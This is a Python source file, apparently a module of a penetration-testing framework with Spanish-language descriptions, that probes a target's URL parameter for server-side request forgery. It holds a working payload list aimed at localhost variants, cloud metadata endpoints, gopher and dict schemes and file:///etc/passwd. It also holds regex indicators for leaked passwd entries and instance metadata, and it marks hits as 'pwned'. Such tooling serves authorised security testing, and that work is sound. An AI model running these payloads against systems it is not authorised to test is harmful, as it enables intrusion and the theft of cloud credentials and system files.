# scripts/http/attack/ssrf_detect.py
import urllib.request, urllib.error, urllib.parse, re
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/",
    "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://[::1]/", "http://0.0.0.0/",
    "http://0177.0.0.1/", "http://2130706433/",
    "dict://127.0.0.1:22/", "gopher://127.0.0.1:22/_",
    "file:///etc/passwd",
]

SSRF_INDICATORS = [
    r"ami-id", r"instance-id", r"root:x:0:0",
    r"computeMetadata", r"ssh-",
]

class Script(BaseScript):
    name        = "ssrf-detect"
    protocol    = "http"
    category    = "attack"
    description = "Detección de SSRF via parámetros URL: endpoints internos y metadatos cloud."

    EXAMPLES = [
        {"flag": "--param", "desc": "Parámetro a inyectar (ej: url, redirect, fetch)",
         "good": "http --script=ssrf-detect -t 10.10.10.5 --path /fetch --param url",
         "bad":  "http --script=ssrf-detect (usa param 'url' por default)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 80)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        param   = kwargs.get("param") or "url"
        ip      = self.target.ip
        base    = f"http://{ip}:{port}"
        findings = []

        for payload in SSRF_PAYLOADS:
            url = f"{base}{path}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                try:
                    resp   = urllib.request.urlopen(req, timeout=timeout)
                    status = resp.status
                    body   = resp.read(65536).decode("utf-8", errors="replace")
                except urllib.error.HTTPError as e:
                    status = e.code
                    body   = e.read(65536).decode("utf-8", errors="replace") if e else ""
                if status == 200:
                    for indicator in SSRF_INDICATORS:
                        if re.search(indicator, body, re.I):
                            findings.append((payload[:60], str(status), indicator))
                            session_db.save_finding(ip, "HTTP", "ssrf_detected",
                                                    f"param={param} payload={payload[:40]}")
                            print_result("HTTP", ip, "pwned", f"SSRF: {payload[:40]}")
                            break
            except Exception:
                pass

        if findings:
            print_table(f"SSRF — {ip}:{port}", ["Payload", "Código", "Indicador"], findings)
        else:
            print_check(f"Sin SSRF en '{param}'", ok=True)

        return findings
